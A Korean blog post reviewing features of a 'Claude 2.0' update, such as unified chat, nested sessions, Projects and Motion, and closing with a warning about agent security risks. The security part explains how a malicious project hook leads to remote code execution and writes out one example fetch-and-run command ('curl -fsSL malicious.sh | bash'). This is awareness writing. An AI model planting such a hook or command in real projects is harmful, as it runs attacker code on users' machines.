클로드 2.0 업데이트 새 기능 및 활용법 총정리

2026년 11월 02일

클로드 2.0 업데이트 새 기능의 핵심은 단순한 대화형 AI를 넘어, 사용자의 지시를 세부 작업으로 스스로 나누고 관리하는 '지능형 실행 작업 공간'으로 완전히 체질을 바꿨다는 점이다.

기존에 사용자를 번거롭게 만들었던 대화 모드와 코워크(Cowork) 모드의 분리가 하나로 통합되었으며, 백그라운드에서 스레드를 지속적으로 돌리는 프로젝트 기능과 코드 탭의 중첩 세션, 그리고 캔버스와 모션 시각화 기능까지 대거 탑재되었다.

이 글에서는 이번 대규모 업데이트로 달라진 실무 활용법부터 강력해진 기능 이면에 숨겨진 보안 취약점 이슈까지 낱낱이 파헤쳐 본다.

통합된 대화창과 백그라운드 지능형 에이전트의 구체적 변화

대화와 코워크의 하나 된 통합 및 캔버스 실시간 작업

불과 얼마 전까지만 해도 클로드를 열면 고민부터 해야 했다. 간단한 질문을 던질 대화창을 쓸 것인지, 아니면 긴 보고서나 코드를 짜는 코워크 모드를 선택할 것인지 모드를 고르는 작업 자체가 흐름을 끊었다.

하지만 9월 16일 업데이트를 통해 클로드 코워크 통합이 이루어지면서 이러한 번거로움이 완전히 사라졌다. 이제는 단 하나의 대화창에서 모든 것이 완결된다.

"귤 농장 수확 체험 날짜가 언제지?"라는 가벼운 질문을 던진 뒤, 바로 연이어 "그럼 체험 예약 안내문을 작성해 줘"라고 요청하면 별도의 창 전환 없이 대화창 옆으로 깔끔한 안내문 문서가 생성된다.

이 대화창 옆에 열리는 '캔버스' 영역은 단순한 결과물 표시창이 아니다. 피아노 학원 겨울 발표회 안내 자료를 부탁하면 표지와 발표 순서표가 들어간 슬라이드 덱을 그 자리에서 뚝딱 만들어 내며, 생성된 덱은 PDF나 구글 슬라이드는 물론 파워포인트(PPT) 파일로 내보내 맥에서 바로 열어볼 수 있다.

동네 분식집 신메뉴 시안처럼 포스터나 인스타 게시물 디자인을 요청했을 때도 캔버스상에서 원하는 위치에 댓글을 달아 "이 폰트만 바꿔줘"라고 지시하면 나머지 디자인은 건드리지 않고 해당 부분만 정확히 수정한다.

생성된 문서나 시안은 기본적으로 비공개 상태이며, 필요할 때 전용 링크로 즉시 공유할 수 있어 실무 협업의 속도가 크게 올라갔다.

코드 탭 중첩 세션이 가져온 멀티태스킹 혁신

10월 15일부터 추가된 코드(Code) 탭의 클로드 중첩 세션 기능은 내가 클로드를 바라보는 시각을 근본적으로 바꿔놓았다. 예전의 AI 작업자들은 화면 뒤에 숨어 있어서 어떤 과정을 거쳐 답을 내는지 알 수 없었고 중간 개입도 불가능했다.

이제는 거대한 과제를 던지면 클로드가 스스로 복잡성을 인지하고 사이드바에 하위 '중첩 세션(Nested Sessions)' 셋을 생성한다. 예컨대 복잡한 물류 배차 요청을 보내면 주문 정리, 기사별 배차표 작성, 고객 안내 문자 초안 작성을 각각의 세부 세션으로 나누어 동시에 진행한다.

업무 현장에서 "분명히 요청 하나만 보냈는데 사이드바에 별도 세션 셋이 한꺼번에 생겨서 깜짝 놀랐어요."라는 반응이 나온 이유가 여기에 있다.

더 놀라운 점은 사이드바에 생성된 각각의 하위 세션에 사용자가 직접 들어가 지시를 수정할 수 있다는 사실이다. "배차표 세션"으로 들어가 "오후 배송건은 따로 묶어줘"라고 지시를 내리면, 해당 세션이 작업을 수정한 뒤 결과를 다시 원래의 메인 대화로 통합 보고한다.

대화가 너무 길어져서 초기 문맥이 밀리거나 AI가 지시를 잊어버리는 이른바 '컨텍스트 환각' 현상을 완벽하게 방지하는 구조다.

작업 흐름을 깨지 않는 바이더웨이 창과 화면 직렬 활용

긴 복잡한 작업을 AI에게 시켜놓고 기다리는 동안 다른 질문을 던지면, 기존 진행 상황이 꼬이거나 대화 타임라인이 더러워지는 문제가 늘 상존했다. 이번 클로드 2.0은 이 문제 역시 정교하게 해결했다.

작업 도중 단축키 `Cmd + ;`를 누르거나 `/btw` (by the way)를 입력하면 메인 대화창 옆으로 별도의 탭 창이 열린다. 배차 작업이 한창 백그라운드에서 돌아가는 와중에 옆 창을 열고 "지금 어디까지 진행됐어?"라고 물으면, 클로드는 메인 대화의 그 시점까지 내용을 빠르게 읽어 파악한 뒤 옆 창에서 즉시 답을 준다. "클로드가 옆 창에서 메인 대화를 그 시점까지 다 읽고 바로 답해 줬습니다."라는 경험담처럼, 메인 작업의 진행 흐름은 단 1초도 끊기지 않는다.

옆 창에서 주고받은 대화는 메인 대화 기록에 남지 않고 앱을 닫으면 자동으로 사라지기 때문에 휘발성 질문을 던지기에 최적이다. 필요한 내용이 있다면 메인 문서로 옮기면 그만이다.

또한 사이드바에서 세션을 `Option + 클릭`하여 나란히 놓는 분할 화면 기능을 활용하면 세션 사이를 오가며 클릭질을 반복하던 소모적 노동이 획기적으로 줄어든다.

장기 프로젝트 관리와 원격 제어 중심의 작업 공간 구축

지속적 메모리 공유와 원격 제어로 연결되는 프로젝트 기능

9월 17일에 도입된 새 프로젝트(Projects) 기능은 AI를 '대화 상대'에서 '진짜 팀장'의 지위로 올렸다. 코디네이터 역할을 맡은 프로젝트 대화 하나가 업무 단위별로 수많은 스레드(Thread)를 띄워 전체 일의 진행 상황을 지휘한다.

핵심은 메모리의 연속성이다. 스레드마다 독립된 컨텍스트 창을 사용하지만, 획득한 핵심 배경 지식과 업무 규칙은 하나의 공유 메모리에 쌓는다.

따라서 스레드를 새로 생성할 때마다 "우리 회사 규칙은 이렇고 내 스타일은 이렇다"고 핑거프린팅 같은 사전 배경 설명을 반복할 필요가 없다. 흩어진 생각이나 할 일을 정리 없이 무작위로 던져놓아도 프로젝트가 알아서 스레드별로 작업을 분배하고, 오버뷰(Overview) 화면에서 완료된 일과 대기 중인 일을 가시화해 준다.

결과물과 원본 파일들은 라이브러리에 알아서 차곡차곡 정리된다. 더욱 강력한 것은 지속성과 원격 제어다. "무엇보다 클라우드에서 도는 스레드는 우리가 노트북을 닫아두어도 멈추지 않고 계속 돌아가더라고요."라는 인용구처럼, 컴퓨터 전원을 꺼도 클라우드상의 프로젝트는 멈추지 않는다.

내 컴퓨터 자원이 필요한 작업은 원격 제어(Remote Control)를 켜두면 스마트폰의 클로드 앱에서 동일한 세션을 실시간으로 이어받아 작업 상태를 모니터링하고 추가 명령을 내릴 수 있다. "오늘 바로 끝낼 일은 세션에서 처리하고, 컴퓨터를 꺼도 돌아가야 할 일은 프로젝트에 맡기시면 됩니다."라는 조언이 정확히 적용되는 지점이다.

체계적인 세션 정리와 섹션 분류를 통한 가시성 확보

에이전틱 AI 도구를 적극적으로 쓰다 보면 누구나 '세션 지옥'을 경험하게 된다. 대화창이 10개, 20개로 늘어나면 어떤 세션이 내 승인이나 답을 기다리는지 일일이 클릭해 들어가 봐야만 했다.

클로드 2.0은 고정 및 모니터링 기능과 섹션(Section) 시스템을 도입해 이 혼란을 정리했다. 중요한 세션을 상단에 고정해둔 상태에서 "지금 내 결정을 기다리는 세션이 어디 어디야?"라고 물으면 클로드가 전체 세션을 모니터링하여 답변 대기 중인 세션을 한눈에 요약해 준다.

심지어 고정된 메인 세션 안에서 다른 세션의 이름을 변경하거나 보관(Archive) 처리하는 제어까지 가능하다.

10월 15일부터 지원되는 섹션 기능을 활용하면 사이드바에 '배차 작업', '고객 문의', '마케팅 시안' 등 프로젝트별, 날짜별 탭을 만들고 세션을 드래그 앤 드롭으로 깔끔하게 분류할 수 있다.

세션 메뉴에서 '섹션으로 옮기기'나 '새 섹션'을 선택하기만 하면 길게 늘어서 있던 과거 기록들이 명확한 체계 아래 재정렬된다.

실시간 대시보드 연동과 모션 기능을 통한 시각화 확장

보고서 작성에서 가장 기어가는 지점은 데이터의 최신화와 애니메이션 시각 자료 제작이었다. 10월 8일에 공개된 실시간 대시보드는 이 두 가지 병목을 깔끔하게 뚫어냈다.

데이터소스에 연결된 대시보드는 창을 열 때마다 실시간 수치를 자동으로 새로고침하여 보여준다. 예컨대 동네 헬스장의 회원 출석 대시보드를 열고 특정 회원군에 대해 질문하면, 대시보드 내의 해당 데이터 행이 실시간으로 하이라이트 되며 어떤 SQL 쿼리로 해당 숫자를 추출했는지까지 명확히 표시된다.

보고서를 완성하자마자 데이터가 오래되어 버리던 과거의 한계가 마침내 극복된 것이다.

같은 날 공개된 모션(Motion) 기능은 차트와 도형, 텍스트를 코드로 직접 제어하여 모션 그래픽 MP4 영상으로 내보내는 기능이다. 기존의 런웨이(Runway)나 소라(Sora) 같은 영상 생성 딥러닝 모델은 글자나 수치를 입력하면 뭉개지거나 환각이 생기는 결정적 결함이 있었다.

그러나 클로드의 모션은 렌더링 코드로 도형과 텍스트를 정밀 움직임 처리하기 때문에 글자와 숫자가 단 1픽셀의 뭉개짐도 없이 정밀하게 출력된다. "영상 생성 모델을 쓰지 않고 코드로 직접 움직여서 글자와 숫자가 그대로 나오니까 이제 다른 프로그램으로 옮겨서 다시 만들 필요가 없어요."라는 평가가 나오는 이유다.

세션 레일과 스킬 닥터를 활용한 컨텍스트 다이어트

아무리 AI 성능이 뛰어나도 대화가 조금만 길어지면 용량이 차서 먹통이 되거나 응답 속도가 느려지면 스트레스가 쌓인다. 대화창이 왜 이렇게 금방 차오르는지 이유조차 알 수 없었던 답답함이 마침내 해소되었다.

10월 15일 대화창 우측에 추가된 '세션 레일'에는 컨텍스트 카드가 실시간으로 표시된다. 첫 질문만 던졌는데도 카드 용량이 꽤 차 있는 것을 볼 수 있는데, 카드를 범주별로 클릭해 보면 시스템 메모리, 활성화된 스킬, 외부 연결 도구가 각각 컨텍스트 용량을 얼마나 잡아먹고 있는지 정확한 퍼센티지로 시각화된다.

여기에 9월 4일 탑재된 `/skill-doctor` 명령어를 입력하면 클로드가 현재 로딩된 스킬들의 사용 빈도와 컨텍스트 점유율을 리포트 형태로 출력한다. 자주 쓰지도 않는 스킬이 메모리를 과하게 점유하고 있다면, 안내에 따라 스킬스(Skills) 설정 메뉴에서 이를 끄거나 삭제함으로써 대화창의 쾌적함을 즉시 회복할 수 있다.

어드바이저 호출과 아웃풋 스타일 제어로 얻는 리소스 최적화

모든 작업에 최상위 모델인 오퍼스(Opus)나 최고 성능 모델을 투입하는 것은 비용적으로나 속도면에서 비효율적이다. 그렇다고 가벼운 하위 모델에 복잡한 의사결정을 맡기자니 결과물의 품질이 미심쩍다.

이 지점을 해결하기 위해 도입된 기능이 바로 어드바이저(`/advisor`) 모드다. 평소에는 가볍고 빠른 모델로 일반 작업을 처리하다가, 엄밀한 검증이나 중요한 결정을 내릴 때만 대화창에 `/advisor` 뒤에 조언을 구할 상위 모델명을 함께 입력하여 임시로 호출한다. "덕분에 비싼 모델을 계속 쓰거나 가벼운 모델의 중요한 결정을 맡기던 고민도 한결 줄어듭니다."라는 말처럼 리소스와 비용 절감의 최적 지점을 제공한다.

또한 9월 11일에 추가된 `/output-style concise` 옵션은 AI의 불필요한 사족을 쳐내는 최고의 무기다. 클로드의 답변이 너무 늘어지거나 장황할 때 이 명령을 입력하면, 동일한 질문에 대해서도 이전의 길고 복잡했던 서술을 버리고 핵심만 요약된 짧고 명확한 답변으로 출력 스타일을 고정한다.

사용자 맞춤 환경을 구성하는 모즈 기능의 활용과 한계

클로드 2.0에 새로 들어간 모즈(Mods) 시스템은 에이전트의 UI와 동작 방식을 사용자가 직접 개조할 수 있도록 돕는 일종의 플러그인 생태계다.

공식 가이드에 따르면 클로드에게 "내가 쓰기 편하게 대화창 옆에 보조 메모장을 띄워주는 모드를 만들어 줘"라거나 "입력창 상단에 자주 쓰는 프롬프트 띠를 배치해 줘"라고 자연어로 요청하는 것만으로 클로드가 해당 기능의 모드 코드를 작성해 설치해 준다.

고정된 인터페이스에 사용자가 맞춰야 했던 기성 소프트웨어의 틀을 깨부순 것이다.

다만 모드는 사용자의 로컬 환경 및 시스템 권한을 직접 활용하여 돌아가는 시스템 코드이므로 무턱대고 아무 모드나 설치해서는 안 된다. 인가되지 않은 외부 커뮤니티에서 공유되는 모드는 개인정보를 훔쳐 가거나 악성 코드를 실행하는 통로가 될 수 있으므로 출처가 검증된 안전한 모드만 선택적으로 설치해야 한다.

🔥 짚고 넘어가야 할 문제 하나

편리함의 극단을 달리는 클로드 2.0 활용법 뒤편에는 무시무시한 보안 취약점이라는 부작용이 도사리고 있다. 파일 접근과 셸 명령 실행 권한을 가진 에이전트 AI에게 내 컴퓨터의 제어권을 넘겨주는 행위가 얼마나 위험할 수 있는지 사용자는 반드시 인지해야 한다.

보안 검증 없는 무분별한 자동화 도입은 기업의 핵심 자산인 API 키 유출과 원격 코드 실행(RCE)이라는 참사로 이어질 수밖에 없다.

에이전틱 AI 시대의 그림자, 취약점과 보안 공급망 문제

프로젝트 후크와 MCP 자동 승인이 부른 원격 코드 실행 위험

클로드 2.0과 터미널 기반 에이전트인 클로드 코드(Claude Code)가 제공하는 강력한 자동화 기능은 반대로 보안 측면에서 치명적인 공격 통로(Attack Vector)가 되고 있다. 보안 연구 기관 Check Point의 보고서에 따르면, 에이전트의 편리성을 위해 도입된 설정 파일 시스템이 오용될 때 심각한 보안 사고가 발생한다.

문제의 핵심은 프로젝트 설정 파일인 `.claude/settings.json`에 정의되는 '후크(Hooks)' 기능이다. 후크는 특정 이벤트(예: `SessionStart`)가 발생할 때 개발자가 지정한 셸 명령을 자동으로 실행하도록 돕는 도구다.

공격자가 악성 셸 명령(`curl -fsSL malicious.sh | bash`)이 담긴 후크 설정 파일을 오픈소스 리포지토리에 넣어두고 개발자를 유인할 경우, 사용자가 해당 디렉터리에서 클로드를 켜는 순간 사용자의 추가 승인 없이 임의의 악성 코드가 즉시 실행(RCE)된다.

실제로 CVE-2025-59536(CVSS 심각도 점수 8.7)으로 지정된 이 취약점은 신뢰할 수 없는 디렉터리 진입 시 코드 삽입을 허용하는 치명적인 결함이었다. 여기에 외부 서비스와 AI를 연결하는 모델 컨텍스트 프로토콜(MCP)의 '모든 프로젝트 서버 자동 승인' 옵션까지 켜져 있다면, 공격자는 사용자 몰래 환경 변수나 조직의 API 키를 외부 서버로 탈취해 갈 수 있다.

개발자가 의심스러운 실행 파일이나 바이너리를 클릭하지 않고 단순히 '프로젝트 폴더를 여는 것'만으로도 시스템 전체가 뚫리는 사태가 벌어지는 것이다.

클로드 미토스가 경고하는 사이드 공격과 금융권 공급망의 과제

앤스로픽이 사내 제한적 보안 프로그램인 '프로젝트 글래스윙(Project Glasswing)'을 통해 선보인 최첨단 AI 모델 '클로드 미토스(Claude Mythos)'의 사례는 AI 보안의 비대칭성을 극명하게 보여준다.

미토스 모델은 주요 운영체제(OS)와 웹 브라우저의 코드베이스를 직접 읽고 추론하여 그동안 발견되지 않았던 심각한 소프트웨어 취약점 수천 건을 자체적으로 찾아냈다. 문제는 이러한 고성능 AI의 취약점 탐지 능력이 해커나 악의적 주체에게 넘어갔을 때 발생할 파급력이다.

기존의 사이버 보안 방어자는 모든 접점을 100% 방어해야 하지만, AI를 쥔 공격자는 단 하나의 결함만 찾아내 뚫고 들어가면 되는 구조적 불균형이 더욱 심화된다.

특히 10년 이상 된 레거시 시스템과 복잡한 오픈소스 라이브러리에 의존하는 금융권, 결제 사업자, 코어뱅킹 플랫폼의 위기감은 고조되고 있다. 기존에는 양자컴퓨팅 위협에 대비해 국제결제은행(BIS)과 스위프트(SWIFT)가 '리프 프로젝트(Project Leap)' 등을 추진하며 수년에 걸쳐 양자내성 암호 체계로 전환해 왔다.

그러나 AI 기반 취약점 공격의 시간표는 양자컴퓨터처럼 수년의 유예기간을 주지 않고 수개월, 수분기 단위로 박두하고 있다. 이제 기업과 정부는 단순히 AI 성능을 자랑할 것이 아니라, CI/CD 파이프라인과 AI 공급망 전반에 걸친 '신뢰 경계'를 획증하고 상시 보안 감시 체계로 보안 패러다임을 즉각 전환해야 한다.

💭 개인적인 생각

클로드 2.0의 이번 업데이트는 분명 감탄을 자아낸다. 대화창 하나에서 보고서와 캔버스 디자인, 슬라이드 덱을 뽑아내고, 컴퓨터를 꺼도 클라우드에서 스레드가 알아서 일을 처리하는 모습을 보고 있으면 노동의 개념이 바뀌고 있음을 피부로 느낀다.

그러나 기술의 진보가 가져오는 화려함 뒤에는 도구에 대한 과도한 주도권 양도라는 위험한 거래가 존재한다. 에이전트가 내 컴퓨터 셸(Shell) 권한을 쥐고 파일 수정부터 네트워크 통신까지 대리 수행하는 순간, 사용자 편의성의 반대급부는 사이버 보안의 거대한 구멍으로 돌아온다.

노동의 효율성을 높이되, 보안의 주도권까지 AI에게 멍하니 넘겨주지는 않는 영리한 제어가 그 어느 때보다 절실한 시점이다.

❓ 자주 묻는 질문

Q. 클로드 2.0 업데이트 주요 변경점은 무엇인가요?

가장 큰 변화는 대화와 코워크 모드가 하나의 대화창으로 통합된 점입니다. 또한 복잡한 작업을 스스로 하위 세션으로 나누어 처리하는 코드 탭 중첩 세션과, 노트북을 덮어도 클라우드에서 백그라운드로 도는 프로젝트 기능, 그리고 실시간 대시보드 및 코딩 기반 MP4 모션 그래픽 생성 기능이 새롭게 탑재되었습니다.

Q. 채팅과 코워크 통합 기능은 어떻게 사용하나요?

별도의 모드 선택 버튼을 누를 필요 없이 단일 대화창에서 가벼운 질의응답을 진행하다가 문서나 시안 작성을 요청하면 됩니다. 요청 즉시 대화창 우측에 '캔버스' 영역이 자동으로 열리며, 이곳에서 발표 자료 덱, 포스터 디자인, 안내문 문서 등이 작성되고 PDF, PPT, HTML 파일 형태로 직접 내보낼 수 있습니다.

Q. 클로드 중첩 세션과 프로젝트 기능의 차이는 무엇인가요?

중첩 세션은 단일 대화 요청을 클로드가 세부 하위 작업 단위로 나누어 사이드바에 여러 세션을 동시 생성해 처리하는 분산 멀티태스킹 방식입니다. 반면 프로젝트 기능은 코디네이터 대화가 여러 스레드를 지휘하며 메모리를 지속 공유하고, 컴퓨터 전원을 꺼도 클라우드상에서 장기 업무를 계속 수행하는 지속형 작업 공간입니다.

이 포스팅은 쿠팡 파트너스 활동의 일환으로, 이에 따른 일정액의 수수료를 제공받습니다.

압도적인 생산성의 날개 뒤에 숨겨진 보안의 고삐를 죄는 자만이 AI 시대의 진짜 주인이 될 것이다.
